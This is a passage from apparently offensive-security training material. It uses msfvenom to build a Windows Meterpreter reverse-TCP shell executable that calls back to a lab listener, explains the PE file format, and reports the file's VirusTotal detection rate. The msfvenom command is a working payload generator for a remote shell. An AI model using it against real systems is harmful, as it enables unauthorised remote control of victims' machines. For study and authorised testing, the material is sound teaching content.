We will demonstrate by scanning a popular Meterpreter payload. 

Using msfvenom, we will genereate a PE file of a simple TCP Reverse Shell: 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f
exe > binary.exe`

***
The Portable Executable (PE)405 file format is used on Windows operating
systems for executable and object files. The PE format represents a Windows
data structure that details the information necessary for the Windows loader406
to manage the wrapped executable code including required dynamic libraries,
API imports and exports tables, etc.
***

Upload this file to VirusTotal and view the result:
51/67 engines detected the file as malicious.

